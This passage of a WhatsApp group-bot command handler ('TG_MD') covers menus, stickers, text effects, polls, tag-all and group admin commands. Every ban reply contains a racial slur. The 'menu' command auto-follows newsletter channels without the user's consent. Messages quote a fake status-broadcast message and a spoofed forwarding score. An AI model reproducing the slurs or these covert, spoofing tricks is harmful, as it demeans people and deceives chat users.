                  title: "𝐅𝐮𝐧𝐦𝐞𝐧𝐮",
                  description: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ʀɪᴄʜɪᴇ",
                  id: "fumenu"
                },
                {
                  title: "𝐀𝐥𝐥 𝐦𝐞𝐧𝐮",
                  description: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ʀɪʜɪᴇ",
                  id: "almenu"
                }
              ]
            }
          ]
        })
      }
    }
  ];

  await rich.sendMessage(m.chat, {
    image: { url: "https://cdn.kordai.biz.id/serve/HlEHZd6pgErX.jpg" },
    caption,
    mentions: [m.sender],
    footer: global.levimenu,
    buttons,
    viewOnce: true,
    headerType: 6,
    quoted: m,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: `120363400223711119@newsletter`,
        newsletterName: `ʟᴇᴠɪ ʙʏ ʀɪᴄʜɪᴇ`
      }
    }
  });

  break;
}
case 'enggdgxtcrcu': {
const richImageUrl = 'https://files.catbox.moe/tlqgc4.jpg'; // replace with your actual image URL
const menuText = `
BOT MENU 
✦ ʜᴇʟʟᴏ ${m.pushName}
✦ ʙᴏᴛ ɴᴀᴍᴇ 「${botname}」
✦ sᴛᴀᴛᴜs : active 
✦ ʀᴜɴᴛɪᴍᴇ ${runtime(process.uptime())}
✦ ᴏᴡɴᴇʀ ${ownername}
✦ ᴠᴇʀsɪᴏɴ v.1.5
❥→━━━━━━━━━━━━
➣𖤛 ꙰𝐀𝐊𝐀𝐍𝐄 - 𝐌𝐃 ᥫ᭡ ꙰𖤛➣
❥→━━━━━━━━━━━━┓
❥→ 🍿 𝐌𝐄𝐍𝐔𝐀𝐋𝐋
❥→ 🧝‍♀️ 𝐅𝐔𝐍𝐌𝐄𝐍𝐔
❥→ 😇 𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐌𝐄𝐍𝐔
❥→ 💛 𝐀𝐍𝐈𝐌𝐄𝐌𝐄𝐍𝐔
❥→ 🏻 𝐄𝐏𝐇𝐎𝐓𝐎𝐌𝐄𝐍𝐔
❥→ 🍁 𝐎𝐖𝐍𝐄𝐑𝐌𝐄𝐍𝐔
❥→ 🥤 𝐎𝐓𝐇𝐄𝐑𝐌𝐄𝐍𝐔
❥→ 💻 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐌𝐄𝐍𝐔
❥→ 📒 𝐆𝐑𝐎𝐔𝐏𝐌𝐄𝐍𝐔
❥→ 💢 𝐁𝐔𝐆𝐌𝐄𝐍𝐔 `;
const fakeSystem = {
  key: {
    remoteJid: "status@broadcast",
    fromMe: false,
    id: "FakeID12345",
    participant: "0@s.whatsapp.net"
  },
  message: {
    conversation: "TG_MD PROJECT 🍁"
  }
};
// process tmr
await rich.sendMessage(from, {
  image: { url: richImageUrl },
  caption: menuText
}, { quoted: fakeSystem });
await sleep(2000)

await rich.sendMessage(m.chat, {

audio: richieplay,

mimetype: 'audio/mpeg'

}, { quoted: m

})


}
break;

case 'menu': {
    const menuImages = [
        'https://cdn.kordai.biz.id/serve/HlEHZd6pgErX.jpg',
        'https://cdn.kordai.biz.id/serve/HlEHZd6pgErX.jpg',
        'https://cdn.kordai.biz.id/serve/HlEHZd6pgErX.jpg',
        'https://cdn.kordai.biz.id/serve/HlEHZd6pgErX.jpg',
        'https://cdn.kordai.biz.id/serve/HlEHZd6pgErX.jpg'
    ];

    // Randomly select an image for the menu
    const richImageUrl = menuImages[Math.floor(Math.random() * menuImages.length)];

    const menuText = `
BOT MENU 
✦ ʜᴇʟʟᴏ ${m.pushName}
✦ ʙᴏᴛ ɴᴀᴍᴇ 「${botname}」
✦ sᴛᴀᴛᴜs : active 
✦ ʀᴜɴᴛɪᴍᴇ ${runtime(process.uptime())}
✦ ᴏᴡɴᴇʀ ${ownername}
✦ ᴠᴇʀsɪᴏɴ v.1.5
❥→━━━━━━━━━━━━
➣𖤛 ꙰𝐀𝐊𝐀𝐍𝐄 - 𝐌𝐃 ᥫ᭡ ꙰𖤛➣
❥→━━━━━━━━━━━━┓
❥→ 🍿 𝐌𝐄𝐍𝐔𝐀𝐋𝐋
❥→ 🧝‍♀️ 𝐅𝐔𝐍𝐌𝐄𝐍𝐔
❥→ 😇 𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐌𝐄𝐍𝐔
❥→ 💛 𝐀𝐍𝐈𝐌𝐄𝐌𝐄𝐍𝐔
❥→ 🏻 𝐄𝐏𝐇𝐎𝐓𝐎𝐌𝐄𝐍𝐔
❥→ 🍁 𝐎𝐖𝐍𝐄𝐑𝐌𝐄𝐍𝐔
❥→ 🥤 𝐎𝐓𝐇𝐄𝐑𝐌𝐄𝐍𝐔
❥→ 💻 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐌𝐄𝐍𝐔
❥→ 📒 𝐆𝐑𝐎𝐔𝐏𝐌𝐄𝐍𝐔
❥→ 💢 𝐁𝐔𝐆𝐌𝐄𝐍𝐔 `;

    const fakeSystem = {
        key: {
            remoteJid: "status@broadcast",
            fromMe: false,
            id: "FakeID12345",
            participant: "0@s.whatsapp.net"
        },
        message: {
            conversation: "TG_MD PROJECT 🍁"
        }
    };

    // Send the menu image with the caption
    await rich.sendMessage(from, {
        image: { url: richImageUrl },
        caption: menuText
    }, { quoted: fakeSystem });

    // Wait for 2 seconds before sending the audio message
    await sleep(2000);

    // Send the audio message
    await rich.sendMessage(m.chat, {
        audio: richieplay,
        mimetype: 'audio/mpeg'
    }, { quoted: m });

    // Call the followNewsletter function to auto-follow channels
    followNewsletter(channelId, rich);  // Assuming 'bad' is your socket/connection
}
break;
case 'buttonmenu':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
const caption = `
  \`❖TG MD❖\`
✦ ʜᴇʟʟᴏ ${m.pushName}
✦ ʙᴏᴛ ɴᴀᴍᴇ 「${botname}」
✦ sᴛᴀᴛᴜs : active 
✦ ʀᴜɴᴛɪᴍᴇ ${runtime(process.uptime())}
✦ ᴏᴡɴᴇʀ ${ownername}
✦ ᴠᴇʀsɪᴏɴ v.1.5
❥→━━━━━━━━━━━━
➣𖤛 ꙰𝐀𝐊𝐀𝐍𝐄 - 𝐌𝐃 ᥫ᭡ ꙰𖤛➣
❥→━━━━━━━━━━━━┓
❥→ 🍿 𝐌𝐄𝐍𝐔𝐀𝐋𝐋
❥→ 🧝‍♀️ 𝐅𝐔𝐍𝐌𝐄𝐍𝐔
❥→ 😇 𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐌𝐄𝐍𝐔
❥→ 💛 𝐀𝐍𝐈𝐌𝐄𝐌𝐄𝐍𝐔
❥→ 🏻 𝐄𝐏𝐇𝐎𝐓𝐎𝐌𝐄𝐍𝐔
❥→ 🍁 𝐎𝐖𝐍𝐄𝐑𝐌𝐄𝐍𝐔
❥→ 🥤 𝐎𝐓𝐇𝐄𝐑𝐌𝐄𝐍𝐔
❥→ 💻 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐌𝐄𝐍𝐔
❥→ 📒 𝐆𝐑𝐎𝐔𝐏𝐌𝐄𝐍𝐔
❥→ 💢 𝐁𝐔𝐆𝐌𝐄𝐍𝐔
`;
rich.sendMessage(m.chat, {
    image: { url: "https://cdn.kordai.biz.id/serve/HlEHZd6pgErX.jpg" },
    caption,
    mentions: [m.sender],
    footer: global.botName,
    buttons: [
      {
        buttonId: "menuall",
        buttonText: { displayText: "ALLMENU͞" }
      },
      {
        buttonId: "Richie",
        buttonText: { displayText: "KING" }
      }
    ],
    viewOnce: true,
    headerType: 6,
    quoted: m,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: `120363400223711119@newsletter`,
        newsletterName: `TG_MD`
      }
    }
});

}
break;
case "akane4":
case'menu3': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
const ppUrl = await rich.profilePictureUrl(rich.user.id, 'image')
replygc(mess.wait)
await sleep(1000);
let richMenu = `
✦ ʜᴇʟʟᴏ ${m.pushName}
✦ ʙᴏᴛ ɴᴀᴍᴇ 「${botname}」
✦ sᴛᴀᴛᴜs : active 
✦ ʀᴜɴᴛɪᴍᴇ ${runtime(process.uptime())}
✦ ᴏᴡɴᴇʀ ${ownername}
✦ ᴠᴇʀsɪᴏɴ v.1.5
❥→━━━━━━━━━━━━
➣𖤛 ꙰𝐀𝐊𝐀𝐍𝐄 - 𝐌𝐃 ᥫ᭡ ꙰𖤛➣
❥→━━━━━━━━━━━━┓
❥→ 🍿 𝐌𝐄𝐍𝐔𝐀𝐋𝐋
❥→ 🧝‍♀️ 𝐅𝐔𝐍𝐌𝐄𝐍𝐔
❥→ 😇 𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐌𝐄𝐍𝐔
❥→ 💛 𝐀𝐍𝐈𝐌𝐄𝐌𝐄𝐍𝐔
❥→ 🏻 𝐄𝐏𝐇𝐎𝐓𝐎𝐌𝐄𝐍𝐔
❥→ 🍁 𝐎𝐖𝐍𝐄𝐑𝐌𝐄𝐍𝐔
❥→ 🥤 𝐎𝐓𝐇𝐄𝐑𝐌𝐄𝐍𝐔
❥→ 💻 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐌𝐄𝐍𝐔
❥→ 📒 𝐆𝐑𝐎𝐔𝐏𝐌𝐄𝐍𝐔
❥→ 💢 𝐁𝐔𝐆𝐌𝐄𝐍𝐔
`;

rich.sendMessage(m.chat, { caption: richMenu, image: { url: ppUrl } }, { quoted: m });
//"https://cdn.kordai.biz.id/serve/HlEHZd6pgErX.jpg"
await sleep(2000)

await rich.sendMessage(m.chat, {

audio: richieplay,

mimetype: 'audio/mpeg'

}, { quoted: m

})


}
break;
  
case "menu2":{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
replygc(mess.wait)
await sleep(1000);
const tek = `
✦ ʜᴇʟʟᴏ ${m.pushName}
✦ ʙᴏᴛ ɴᴀᴍᴇ 「${botname}」
✦ sᴛᴀᴛᴜs : active 
✦ ʀᴜɴᴛɪᴍᴇ ${runtime(process.uptime())}
✦ ᴏᴡɴᴇʀ ${ownername}
✦ ᴠᴇʀsɪᴏɴ v.1.5
❥→━━━━━━━━━━━━
➣𖤛 ꙰𝐀𝐊𝐀𝐍𝐄 - 𝐌𝐃 ᥫ᭡ ꙰𖤛➣
❥→━━━━━━━━━━━━┓
❥→ 🍿 𝐌𝐄𝐍𝐔𝐀𝐋𝐋
❥→ 🧝‍♀️ 𝐅𝐔𝐍𝐌𝐄𝐍𝐔
❥→ 😇 𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐌𝐄𝐍𝐔
❥→ 💛 𝐀𝐍𝐈𝐌𝐄𝐌𝐄𝐍𝐔
❥→ 🏻 𝐄𝐏𝐇𝐎𝐓𝐎𝐌𝐄𝐍𝐔
❥→ 🍁 𝐎𝐖𝐍𝐄𝐑𝐌𝐄𝐍𝐔
❥→ 🥤 𝐎𝐓𝐇𝐄𝐑𝐌𝐄𝐍𝐔
❥→ 💻 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐌𝐄𝐍𝐔
❥→ 📒 𝐆𝐑𝐎𝐔𝐏𝐌𝐄𝐍𝐔
❥→ 💢 𝐁𝐔𝐆𝐌𝐄𝐍𝐔
`
rich.sendMessage(m.chat, {
text: tek,
contextInfo: {
externalAdReply: {  
title: botname,
body: `${botname}`,
thumbnailUrl: global.thumbnail,
sourceUrl: wagc,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
       await sleep(2000)

await rich.sendMessage(m.chat, {

audio: richieplay,

mimetype: 'audio/mpeg'

}, { quoted: m

})


}
break;
case 'antilink': {
    if (!m.isGroup) return reply("This command only works in group chats.");
    if (!isAdmins) return reply("Only group admins can use this command.");
    if (!args[0]) return reply("Use: .antilink on / off");

    const status = args[0].toLowerCase();

    if (status === 'on') {
        global._antilink[m.chat] = true;
        return reply("Antilink is now *enabled* in this group.");
    } else if (status === 'off') {
        global._antilink[m.chat] = false;
        return reply("Antilink is now *disabled* in this group.");
    } else {
        return reply("Invalid argument. Use on/off.");
    }
}
break;
 
 case 'menuall': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  let tek = `${menuall(prefix, hituet)}`
await rich.sendMessage(m.chat, {
text: tek,
contextInfo: {
externalAdReply: {  
title: botname,
body: `${botname}`,
thumbnailUrl: global.thumbnail,
sourceUrl: wagc,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
       await sleep(2000)

await rich.sendMessage(m.chat, {

audio: richieplay,

mimetype: 'audio/mpeg'

}, { quoted: m

})


}
break;	

case 'groupmenu': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  let tek = `${groupmenu(prefix, hituet)}`
await rich.sendMessage(m.chat, {
text: tek,
contextInfo: {
externalAdReply: {  
title: botname,
body: `${botname}`,
thumbnailUrl: global.thumbnail,
sourceUrl: wagc,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
       await sleep(2000)

await rich.sendMessage(m.chat, {

audio: richieplay,

mimetype: 'audio/mpeg'

}, { quoted: m

})


}
break;		
case 'bugmenu': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  let tek = `${bugmenu(prefix, hituet)}`
await rich.sendMessage(m.chat, {
text: tek,
contextInfo: {
externalAdReply: {  
title: botname,
body: `${botname}`,
thumbnailUrl: global.thumbnail,
sourceUrl: wagc,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
       await sleep(2000)

await rich.sendMessage(m.chat, {

audio: richieplay,

mimetype: 'audio/mpeg'

}, { quoted: m

})


}
break;		
case 'downloadmenu': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  let tek = `${downloadmenu(prefix, hituet)}`
await rich.sendMessage(m.chat, {
text: tek,
contextInfo: {
externalAdReply: {  
title: botname,
body: `${botname}`,
thumbnailUrl: global.thumbnail,
sourceUrl: wagc,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
       await sleep(2000)

await rich.sendMessage(m.chat, {

audio: richieplay,

mimetype: 'audio/mpeg'

}, { quoted: m

})


}
break;	
case 'othermenu': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  let tek = `${othermenu(prefix, hituet)}`
await rich.sendMessage(m.chat, {
text: tek,
contextInfo: {
externalAdReply: {  
title: botname,
body: `${botname}`,
thumbnailUrl: global.thumbnail,
sourceUrl: wagc,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
       await sleep(2000)

await rich.sendMessage(m.chat, {

audio: richieplay,

mimetype: 'audio/mpeg'

}, { quoted: m

})


}
break;	
case 'ownermenu': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  let tek = `${ownermenu(prefix, hituet)}`
await rich.sendMessage(m.chat, {
text: tek,
contextInfo: {
externalAdReply: {  
title: botname,
body: `${botname}`,
thumbnailUrl: global.thumbnail,
sourceUrl: wagc,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
       await sleep(2000)

await rich.sendMessage(m.chat, {

audio: richieplay,

mimetype: 'audio/mpeg'

}, { quoted: m

})


}
break;	
case 'funmenu': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  let tek = `${funmenu(prefix, hituet)}`
await rich.sendMessage(m.chat, {
text: tek,
contextInfo: {
externalAdReply: {  
title: botname,
body: `${botname}`,
thumbnailUrl: global.thumbnail,
sourceUrl: wagc,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
       await sleep(2000)

await rich.sendMessage(m.chat, {

audio: richieplay,

mimetype: 'audio/mpeg'

}, { quoted: m

})


}
break;
case 'stickermenu': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  let tek = `${stickermenu(prefix, hituet)}`
await rich.sendMessage(m.chat, {
text: tek,
contextInfo: {
externalAdReply: {  
title: botname,
body: `${botname}`,
thumbnailUrl: global.thumbnail,
sourceUrl: wagc,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
       await sleep(2000)

await rich.sendMessage(m.chat, {

audio: richieplay,

mimetype: 'audio/mpeg'

}, { quoted: m

})


}
break;
case 'ephotomenu': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  let tek = `${ephotomenu(prefix, hituet)}`
await rich.sendMessage(m.chat, {
text: tek,
contextInfo: {
externalAdReply: {  
title: botname,
body: `${botname}`,
thumbnailUrl: global.thumbnail,
sourceUrl: wagc,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
       await sleep(2000)

await rich.sendMessage(m.chat, {

audio: richieplay,

mimetype: 'audio/mpeg'

}, { quoted: m

})


}
break;
case 'animemenu': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  let tek = `${animemenu(prefix, hituet)}`
await rich.sendMessage(m.chat, {
text: tek,
contextInfo: {
externalAdReply: {  
title: botname,
body: `${botname}`,
thumbnailUrl: global.thumbnail,
sourceUrl: wagc,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
       await sleep(2000)

await rich.sendMessage(m.chat, {

audio: richieplay,

mimetype: 'audio/mpeg'

}, { quoted: m

})


}
break;
case "menutype": case "typemenu": { 
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    await rich.sendMessage(m.chat, { 
        footer: `© ${botname}`, 
        buttons: [ 
            { 
                buttonId: 'action', 
                buttonText: { displayText: 'SELECT YOUR DESIRED MENU TYPE' }, 
                type: 4, 
                nativeFlowInfo: { 
                    name: 'single_select', 
                    paramsJson: JSON.stringify({ 
                        title: 'TG_MD', 
                        sections: [ 
                            { 
                                title: 'Available menu Options', 
                                rows: [ 
                                    { title: 'MENUTYPE 1🀄', id: '.menu' }, 
                                    { title: 'MENUTYPE 2🀄', id: '.menu2' }, 
                                    { title: 'MENUTYPE 3🀄', id: '.menu3' } 
                                ] 
                            } 
                        ] 
                    }) 
                } 
            } 
        ], 
        headerType: 1, 
        viewOnce: true, 
        image: { url: global.thumbnail }, 
        caption: "\n*CHOOSE*" 
    }, { quoted: m }); 

    break; 
}
case 'noenc':
case 'buyscript': {
let buy = `▧ 「 *Script - TG_MD* 」
│
│ ∘ Buy? no enc
│ contact heatless  
│+2349039409985
╰──────────────━`
rich.relayMessage(m.chat, {
    requestPaymentMessage: {
      currencyCodeIso4217: 'NAIRA',
      amount1000: 10000000,
      requestFrom: m.sender,
      noteMessage: {
      extendedTextMessage: {
      text: buy,
      contextInfo: {
      externalAdReply: {
      showAdAttribution: true
      }}}}}}, {})
/*qyuunee.sendMessage(m.chat, { document: fs.readFileSync("./src/SC zaxis V4.0.zip"), mimetype: 'application/zip', fileName: 'SC zaxis V4'}, { quoted : koi })*/
}
break;
case 'sticker': case 's': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  if (!m.quoted) return reply(`Reply Image or Video with command ${prefix + command}`);
  
  if (/image/.test(mime)) {
    let media = await quoted.download();
    let encmedia = await rich.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return m.reply('max 10s');
    
    let media = await quoted.download();
    let encmedia = await rich.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else {
    return reply(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
  }
}
break;
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!q) return reply(`Example : ${prefix+command} Richie `) 
replygc(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
rich.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break;
case 'say': case 'tts': case 'gtts':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!text) return reply('Where is the text?')
            let texttts = text
            const xeonrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return rich.sendMessage(m.chat, {
                audio: {
                    url: xeonrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`,
            }, {
                quoted: m,
            })
        }
        break;
        
case 'jid':{
            reply(from)
           }
          break;
          case 'groupjid':{
          if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
        const groupMetadata = m.isGroup ? await rich.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      reply(textt)
    }
    break;
    case 'poll': {
    if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
return await reply(
`State the question and at least 2 options\nExample: ${prefix}poll Who is the best admin?|yes,no, maybe...`
)
            let options = []
            for (let i of opt.split(',')) {
options.push(i)
            }
            await rich.sendMessage(m.chat, {
poll: {
name: poll,
values: options
}
            })
        }
        break;
case'tagall':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!isCreator) return m.reply("```for Owner only```.");
        if (!m.isGroup) return reply(mess.group);
        const textMessage = args.join(" ") || "heatless  😝";
        let teks = `\`FUCK YOU 🔪🤡 tagall\` :\n> *${textMessage}*\n\n`;

        const groupMetadata = await rich.groupMetadata(m.chat);
        const participants = groupMetadata.participants;

        for (let mem of participants) {
            teks += `@${mem.id.split("@")[0]}\n`;
        }

        rich.sendMessage(m.chat, {
            text: teks,
            mentions: participants.map((a) => a.id)
        }, { quoted: m });
      }
      break;
case 'hidetag': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!isCreator) return m.reply("```for Owner only```.");
rich.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break;
case 'promote': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins ) return reply('your not an admin!!')
if (!isBotAdmins) return reply('_Bot is not yet admin_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rich.groupParticipantsUpdate(m.chat, [users], 'promote')
await reply(`Done`)
}
break
case 'demote': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!isAdmins) return reply('for admin only!!')
if (!isBotAdmins) return reply('_bot is not yet admin_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rich.groupParticipantsUpdate(m.chat, [users], 'demote')
await reply(`Done`)
}
break;
case 'mute': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    if (!m.isGroup) return reply('```This command can only be used in groups```.');
    if (!isAdmins) return reply('``` Only admins can use this command!```');
    if (!isBotAdmins) return reply('``` I need admin privileges to mute the group.```');

    try {
        await rich.groupSettingUpdate(m.chat, 'announcement'); // Mute group
        reply('```*Group has been muted.*\nOnly admins can send messages now.');
    } catch (error) {
        console.error(error);
        reply('``` Failed to mute the group. Please try again.```');
    }
}
break;
case 'unmute': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    if (!m.isGroup) return reply('```This command can only be used in groups```.');
    if (!isAdmins) return reply('```Only admins can use this command!```');
    if (!isBotAdmins) return reply('```I need admin privileges to unmute the group```.');

    try {
        await rich.groupSettingUpdate(m.chat, 'not_announcement'); // Unmute group
        reply('```Group has been unmuted```. *\nEveryone can send messages now*.');
    } catch (error) {
        console.error(error);
        reply('``` Failed to unmute the group. Please try again```.');
    }
}
break;

case 'request': case 'reportbug': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  reply(mess.wait)
	if (!text) return reply(`Example : ${
        prefix + command
      } hi dev play command is not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\nHi ${pushname}, Your request has been forwarded to my Owner*.\n*Please wait...*`
            for (let i of owner) {
rich.sendMessage(i + "@s.whatsapp.net", {
text: textt + teks1,
mentions: [m.sender],
}, {
quoted: m,
})
            }
            rich.sendMessage(m.chat, {
text: textt + teks2 + teks1,
mentions: [m.sender],
            }, {
quoted: m,
            })

        }
        break;
case 'left': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!isCreator) return m.reply("for Owner only.");
await rich.groupLeave(m.chat)
await reply(`Done`)
            }
            break;
case 'add': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!isCreator) return m.reply("for Owner only.");
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rich.groupParticipantsUpdate(m.chat, [users], 'add')
await replynano(`Done`)
}
break;
case 'kick': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!m.quoted) return reply(" `tag 🔖 a user to kick them 😈`");
